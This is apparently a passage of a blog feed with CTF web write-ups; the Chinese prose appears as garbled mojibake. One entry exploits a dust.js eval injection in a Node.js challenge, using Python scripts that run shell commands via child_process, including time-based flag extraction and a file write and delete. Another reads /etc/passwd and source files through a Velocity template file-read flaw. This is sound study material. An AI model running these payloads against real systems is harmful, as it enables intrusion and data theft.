å…¥å‚æ•°æ—¶å®ƒä¼šæŠŠæ•æ„Ÿå­—ç¬¦åšå¤„ç†ï¼Œè€Œå¦‚æœä¼ å…¥æ•°ç»„æ—¶åˆ™ä¸ä¼šå¤„ç†æ•æ„Ÿå­—ç¬¦ï¼Œå³å¯rceã€‚</p><p>å†å¤šå˜´ä¸€å¥ï¼Œåˆ°ç¡®å®šæ˜¯dustçš„æ´è¿™ä¸€æ­¥æˆ‘æœ¬æ¥ä»¥ä¸ºå¼¹ä¸ªshellå°±å®Œäº‹äº†ã€‚ç»“æœæµ‹äº†å¥½ä¹…å‘ç°ä¸çŸ¥é“æ˜¯ä¸é€šå¤–ç½‘è¿˜æ˜¯æ²¡èƒ½æ‰§è¡Œã€‚å·®ç‚¹ä»¥ä¸ºæ‰¾é”™æ´äº†ã€‚ç›´åˆ°ä»–æ”¹äº†é¢˜æ‰å‘ç°dustä¾èµ–ç¡®è®¤æ²¡æ‰¾é”™æ´ï¼Œä¸“å¿ƒæµ‹ä¸‹å»çš„ã€‚<br>å½“ç„¶æ²¡æœ‰æŠ¥é”™æˆ‘ä»¬ä¹Ÿæœ‰å‡ ç§åŠæ³•ç¡®è®¤æ­¤å¤„å­˜åœ¨dustçš„evalæ¼æ´<br>æ¯”å¦‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">addNotes?message&#x3D;aaa%5C</span><br></pre></td></tr></table></figure><p>ä¼šå¯¼è‡´</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(&quot;&#39;xxx\&#39; &#x3D;&#x3D; &#39;desktop&#39;&quot;);</span><br></pre></td></tr></table></figure><p>è§¦å‘æŠ¥é”™<br>å†æ¯”å¦‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">addNotes?message[]&#x3D;&amp;message[]&#x3D;y%27-console.log(7)</span><br></pre></td></tr></table></figure><p>ä¹Ÿä¼šæŠ¥é”™ã€‚å› ä¸ºæˆ‘ä»¬æ­¤æ—¶å¼•å·æ²¡æœ‰è¢«è½¬ä¹‰ç›´æ¥é€å…¥eval.è§¦å‘æŠ¥é”™ã€‚<br>æ‰€ä»¥ï¼Œå¦‚æœæœ‰ç€è‰¯å¥½çš„FUZZæ‰‹æ®µï¼Œé»‘ç›’ä¹Ÿå¯ä»¥fuzzå‡ºé—®é¢˜å¹¶ç¡®è®¤ä¾èµ–é”™è¯¯ã€‚</p><p>æœ€åï¼Œæˆ‘ä»¬ä½¿ç”¨evalè¯­å¥å‘½ä»¤æ‰§è¡Œã€‚å½“ç„¶å› ä¸ºä¸é€šå¤–ç½‘æ²¡æœ‰å›æ˜¾æ‰€ä»¥éå¸¸ç‹—ã€‚æˆ‘æœ€åé€‰æ‹©æŠŠç»“æœå†™é™æ€æ–‡ä»¶ã€‚å¹¶ä¸”è¿™é‡Œé™æ€ç›®å½•æ˜¯çŒœäº†ä¸€æ‰‹<code>public</code>ã€‚æ‰€ä»¥å¯ä»¥ç›´æ¥å†™<code>/proc/self/cwd/public/css/style.css</code>æˆ–è€…åœ¨çˆ†å‡ºæ˜¯appç›®å½•åç›´æ¥å†™<code>/app/public/css</code><br>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">url=<span class="string">"http://dusty.darkarmy.xyz/"</span></span><br><span class="line">data=<span class="string">"""j:[&#123;"id":1,"body": ["1","1'-console.log(require('child_process').exec('cat /flag.txt &gt; /app/public/css/style.css').toString());//"]&#125;]"""</span></span><br><span class="line">print(quote(data))</span><br><span class="line">r=requests.get(url,cookies=&#123;<span class="string">'note'</span>:quote(data)&#125;)</span><br><span class="line">print(r.text)</span><br><span class="line">r=requests.get(url+<span class="string">'css/style.css'</span>)</span><br><span class="line">print(r.text)</span><br><span class="line">data=<span class="string">"""j:[&#123;"id":1,"body": ["1","1'-console.log(require('child_process').exec('rm /app/public/css/style.css').toString());//"]&#125;]"""</span></span><br><span class="line">print(quote(data))</span><br><span class="line">r=requests.get(url,cookies=&#123;<span class="string">'note'</span>:quote(data)&#125;)</span><br></pre></td></tr></table></figure><p>cookieå¯æ§æ‰€æœ‰å†…å®¹ä¸Šé¢è¯´è¿‡äº†ã€‚åªä¸è¿‡æµ‹è¯•æ—¶å› ä¸ºè·¯ç”±å¥½ç”¨å°±æ²¡æ§cookie.</p><p>åšå‡ºæ¥åé—®äº†ä¸‹å‡ºé¢˜äººæœç„¶ä¸æ˜¯é¢„æœŸã€‚å½“ç„¶è¿™é‡Œæˆ‘ä¸å¤ªç¡®å®šé¢„æœŸæ˜¯å•¥ï¼Œä¸è¿‡å·®çš„åº”è¯¥ä¸å¤šã€‚å½“ç„¶èŠå®Œåå‡ºé¢˜äººé¡ºæ‰‹ä¿®äº†ä¸‹å†™æ–‡ä»¶çš„æƒé™ :ï¼‰<br>ç„¶åå°±æ˜¯è¿™ç§åšæ³•æˆ‘è‡ªå·±ä¹Ÿä¸æ˜¯å¾ˆå–œæ¬¢ã€‚è‡ªå·±å‡ºè¿‡çš„nodejsé¢˜ç›®åœ¨å¯ä»¥rceçš„æƒ…å†µä¸‹æˆ‘éƒ½æŠŠå·¥ä½œç›®å½•æŒ‰rootæƒé™è®¾ç½®ã€‚å°±æ˜¯ä¸ºäº†é˜²æ­¢å†™æ–‡ä»¶ã€‚ä¸è¿‡ä¸€èˆ¬ä¼šé…ç½®äº†é˜²æ­¢æ—¶é—´ç›²æ³¨ï¼Œæ‰€ä»¥éƒ½ä¼šç»™å‡ºrceçš„å›æ˜¾</p><p>æ‰€ä»¥è¿™é‡ŒçŒœä¸€æ‰‹æœ¬é¢˜é¢„æœŸçš„æ–¹æ³•æ˜¯time-based-rce:<br>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote,unquote</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url=<span class="string">"http://dusty.darkarmy.xyz/"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">js_exp</span><span class="params">(str1)</span>:</span></span><br><span class="line">    x=[]</span><br><span class="line">    str1 = str1.strip(<span class="string">' '</span>)</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> str1:</span><br><span class="line">        x.append(str(ord(ch)))</span><br><span class="line">    t=<span class="string">','</span>.join(x)</span><br><span class="line">    result=<span class="string">'eval(String.fromCharCode('</span>+t+<span class="string">'))'</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    print(num)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> string.printable:</span><br><span class="line">        cmd = <span class="string">"""require('child_process').execSync(`if [ $(cat /flag.txt | cut -c &#123;&#125;) = '&#123;&#125;' ];then sleep 3;fi`)"""</span>.format(num,i)</span><br><span class="line">        payload = js_exp(cmd)</span><br><span class="line">        data = <span class="string">"""j:[&#123;"id":1,"body": ["1","1'-"""</span> + payload + <span class="string">""";//"]&#125;]"""</span></span><br><span class="line">        t = time.time()</span><br><span class="line">        r = requests.get(url, cookies=&#123;<span class="string">'note'</span>: quote(data)&#125;)</span><br><span class="line">        <span class="keyword">if</span> time.time() - t &gt; <span class="number">3</span>:</span><br><span class="line">            flag += i</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>flag:<br><code>darkCTF{n0d3js_l1br4r13s_go3s_brrrr!}</code></p><p>å› ä¸ºä¸€äº›æ ¼å¼åŸå› ã€‚æˆ‘æŠŠpayloadç”¨evalè½¬åŒ–äº†ä¸€ä¸‹ï¼Œè¿™æ ·çœ‹èµ·æ¥æ›´èˆ’æœä¸€äº›.å¹¶ä¸”ä¸ç”¨æ‹…å¿ƒå¥‡å¥‡æ€ªæ€ªçš„å¼•å·é—®é¢˜ :)</p><p>ä¸è¿‡é¢˜ç›®æˆ‘è§‰å¾—å¾ˆæœ‰å¯å‘æ€§ï¼Œä¸»è¦æ˜¯ç»™äº†æˆ‘ä¸€äº›é¢å¯¹nodejsé»‘ç›’å¤„ç†çš„æ‰‹æ®µã€‚é‚£å°±æ˜¯åˆ©ç”¨å…¶å®¹æ˜“æŠ¥é”™çš„ç‰¹æ€§è¿›è¡ŒFUZZï¼Œå¾—åˆ°ç›®å½•è¿™æ ·çš„å…³é”®ä¿¡æ¯ï¼Œæˆ–è€…æ˜¯ä¾èµ–çš„å…³é”®ä¿¡æ¯ã€‚åŒæ—¶ä¸€å®šç¨‹åº¦ä¸Šå¯ä»¥æ¨æµ‹è¯­å¥ï¼Œç”šè‡³ä¸éœ€è¦çŸ¥é“ä¾èµ–æ¼æ´çš„ç»†èŠ‚å°±èƒ½ç›´æ¥ä¸Šæ‰‹ã€‚</p><p>æœ€åé“ä¸ªæ­‰ï¼Œå› ä¸ºæŠŠflagå†™åˆ°cssé‡Œåè‡ªå·±å°±æŠŠcssç»™åˆ äº†ã€‚å¯¼è‡´åé¢é¢˜ç›®ä¸€ç›´æ²¡æœ‰style.cssâ€¦â€¦</p><h2 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h2><p>åé¢çš„é¢˜åœ¨æ‰“å·…å³°æå®¢æ‘¸é±¼æ—¶çœ‹äº†çœ‹ã€‚åšäº†ä¸ªå…¥é—¨é¢˜è·Ÿä¸€ä¸ªUser-Agentçš„æŠ¥é”™æ³¨å…¥ã€‚æ€»ä¹‹éš¾åº¦æ•´ä½“å¾ˆå…¥é—¨å°±æ²¡ç»§ç»­çœ‹äº†ã€‚<br>æ²¡å•¥è¯´çš„ã€‚å·…å³°æå®¢ä½“éªŒäº†ä¸€æŠŠå¸¦é£çš„æ„Ÿè§‰ã€‚å›½èµ›å°±è¦é è‡ªå·±åŠ¨æ‰‹ä¸°è¡£è¶³é£Ÿäº†ã€‚åŠ æ²¹å§ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é’“é±¼åŸ-zblog</title>
      <link href="2020/08/27/%E9%92%93%E9%B1%BC%E5%9F%8E-zblog/"/>
      <url>2020/08/27/%E9%92%93%E9%B1%BC%E5%9F%8E-zblog/</url>
      
        <content type="html"><![CDATA[<p>æœ€è¿‘å¿™ç€å¤ä¹ å»äº†ã€‚ç­‰åˆ°ä¸­åˆæ¦‚ç»Ÿçš„å¤ä¹ è¯¾ç»“æŸäº†æ‰æœ‰æ—¶é—´å®Œæ•´çœ‹ä¸‹é¢˜ã€‚é™¤å¼€ä¸€é“web-pwn,å‰©ä¸‹ä¸¤ä¸ªphpéƒ½æ˜¯å¸¸è§„è€ƒç‚¹,å°±æ˜¯è„‘æ´è·Ÿç¯å¢ƒçœŸå¿ƒæ¶å¿ƒäººã€‚å­¦å¼Ÿä»¬ä¹Ÿè½»æ¾è§£å†³ï¼Œåº”è¯¥ä¸éœ€è¦ä»€ä¹ˆè®°å½•ã€‚æˆ‘è‡ªå·±åšäº†ä¸‹zblogè¿™é“javaé¢˜,ç®€å•è®°å½•ä¸‹ã€‚</p><a id="more"></a><p>æœ€è¿‘ciscnèµ›åŒºç¬¬7æ‰“è¿›åˆ†åŒºèµ›ã€‚å¼ºç½‘æ¯è·Ÿç€SUæ‹¿äº†ç¬¬12ã€‚(å°±æ˜¯è‡ªå·±å¤ªæäº†,éš¾é¢˜ä¸€å¾‹å¡å£³,æœç„¶ä¸å¥½å¥½ç ”ç©¶phpè·Ÿjavaæ˜¯æ²¡æœ‰å‡ºè·¯çš„).ç„¶åä¸ºäº†å›½èµ›å‡ºäº†é“Node.jsä¸çŸ¥é“æœ‰æ²¡æœ‰æœºä¼šæ‹¿åˆ°åˆ«çš„èµ›åŒºå»,ä¼°è®¡çœŸæ‹¿äº†ä¼šä¸¢äººå§ã€‚å¤ä¹ çš„æ—¶é—´ä¹Ÿå¾ˆå°‘ã€‚ä¸çŸ¥é“è€ƒè¯•ä¼šä¸ä¼šç‚¸â€¦â€¦ä½†æ˜¯æ¯æ¬¡ç»“æŸä¸€ä¸ªé˜¶æ®µæ€»è¦å†™å†™æ–‡ç« çš„ã€‚æ‰€ä»¥å½¢å¼åŒ–åœ°å†™å†™ã€‚</p><h2 id="zblog"><a href="#zblog" class="headerlink" title="zblog"></a>zblog</h2><p>ç®€å•java.å°±æ˜¯ç¯å¢ƒå¡çš„è¦æ­»ã€‚</p><p>titleå‚æ•°å­˜åœ¨æ–‡ä»¶è¯»å–ã€‚åé¢çœ‹æºç ä¼šå‘ç°æ˜¯ä»»æ„æ¨¡æ¿æ–‡ä»¶æ¸²æŸ“çš„ã€‚<br>è¿™é‡Œæ²¡è®°é”™çš„è¯æœ‰ä¸ªå°ç»†èŠ‚å°±æ˜¯ä¸èƒ½éšä¾¿æ’<code>../</code>æ¥ç©¿è¶Šè·¯å¾„ã€‚åé¢ä¼šå‘ç°å®ƒæ˜¯æ‹¼æ¥è·¯å¾„çš„æ‰€ä»¥è·¯å¾„ä¸èƒ½éšä¾¿æ„é€ ã€‚è€Œä¸”ä¼¼ä¹ä¸€å¼€å§‹å°è¯•è¯»æ–‡ä»¶çš„æ—¶å€™æœ‰ç‚¹è¿·ã€‚æ–‡ä»¶æœ«å°¾åŠ äº†ä¸ª<code>/</code>æ‰èƒ½è¯»åˆ°,ä¸åŠ è¯»ä¸åˆ°ã€‚ä¸çŸ¥é“æ˜¯ä»€ä¹ˆç¥å¿…æ“ä½œã€‚ç„¶ååæ¥å¥½åƒåˆç»™ä¿®å¥½äº†ï¼Ÿï¼Ÿï¼Ÿ</p><p>æ€»ä¹‹fuzzä¸€ä¸‹å¯ä»¥æ‰¾åˆ°æ ¹ç›®å½•çš„ä½ç½®è¯»åˆ°<code>/etc/passwd</code>ã€‚æ¥ç€è¯»ä¸‹<code>/proc/self/cmdline</code>ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar /home/ctf/web/target/web-1.0-SNAPSHOT-jar-with-dependencies.jar</span><br></pre></td></tr></table></figure><p>ä¸ªäººè§‰å¾—pythonè·Ÿjavaç¯å¢ƒåœ¨æœ‰arbitary file readçš„æƒ…å†µä¸‹è¯»ä¸‹cmdlineæŒºé‡è¦çš„ã€‚åŸºæœ¬éƒ½ä¼šæš´éœ²ç»å¯¹è·¯å¾„ã€‚æ¯”å¦‚æ­¤å¤„ã€‚<br>æ›´é‡è¦çš„æ˜¯è¿™ä¸ªtarget.å†™è¿‡mavené¡¹ç›®çš„éƒ½çŸ¥é“maven buildå¥½çš„å†…å®¹éƒ½æ”¾åœ¨targetæ–‡ä»¶å¤¹ä¸‹ã€‚æ‰€ä»¥è¿™é‡ŒåŸºæœ¬ç¡®å®šèƒ½å¤Ÿç¡®å®šæŒ‰mavené¡¹ç›®ç»“æ„æ¥è¯»æ–‡ä»¶ã€‚</p><p>åªè¦çŸ¥é“ç»“æ„å°±ç­‰äºæŠŠæ‰€æœ‰æ–‡ä»¶éƒ½æš´éœ²å‡ºæ¥äº†ã€‚<br><img src="/2020/08/27/%E9%92%93%E9%B1%BC%E5%9F%8E-zblog/0.PNG" class="lazyload" data-srcset="0.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>å…ˆè¯»ä¸‹pom.xmlã€‚å‘ç°</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">"http://maven.apache.org/POM/4.0.0"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>ctf<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project.reporing.outputEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.reporing.outputEncoding</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.sparkjava<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spark-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.9.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.sparkjava<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spark-template-velocity<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>slf4j-nop<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.30<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.velocity<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>velocity<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-assembly-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">archive</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">manifest</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">mainClass</span>&gt;</span>Blog<span class="tag">&lt;/<span class="name">mainClass</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">archive</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">descriptorRefs</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">descriptorRef</span>&gt;</span>jar-with-dependencies<span class="tag">&lt;/<span class="name">descriptorRef</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">descriptorRefs</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">id</span>&gt;</span>make-assemble<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">phase</span>&gt;</span>package<span class="tag">&lt;/<span class="name">phase</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">goal</span>&gt;</span>single<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">     </span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ä»mainclassè¿™é‡Œçš„å€¼å¯ä»¥çœ‹å‡ºåŠ è½½çš„ä¸»ç±»Blog.classã€‚æŒ‰ç…§mavené»˜è®¤æ²¡æœ‰åŒ…çš„ç»“æ„ç›´æ¥è¯»<code>../../../../src/main/java/Blog.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> spark.Spark.*;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.velocity.Template;</span><br><span class="line"><span class="keyword">import</span> org.apache.velocity.VelocityContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.velocity.app.VelocityEngine;</span><br><span class="line"><span class="keyword">import</span> spark.template.velocity.VelocityTemplateEngine;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.StringWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Blog</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">log</span><span class="params">(String fname, String content)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            FileWriter writer = <span class="keyword">new</span> FileWriter(fname, <span class="keyword">true</span>);</span><br><span class="line">            writer.write(content);</span><br><span class="line">            writer.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] arg)</span> </span>&#123;</span><br><span class="line">        staticFiles.location(<span class="string">"/public"</span>);</span><br><span class="line"></span><br><span class="line">        VelocityEngine velocityEngine = <span class="keyword">new</span> VelocityEngine();</span><br><span class="line">        velocityEngine.setProperty(VelocityEngine.RESOURCE_LOADER, <span class="string">"file"</span>);</span><br><span class="line">        velocityEngine.setProperty(VelocityEngine.FILE_RESOURCE_LOADER_PATH, <span class="string">"/"</span>);</span><br><span class="line">        velocityEngine.init();</span><br><span class="line">        VelocityContext context = <span class="keyword">new</span> VelocityContext();</span><br><span class="line"></span><br><span class="line">        get(<span class="string">"/"</span>, (request, response) -&gt; &#123;</span><br><span class="line">            request.session(<span 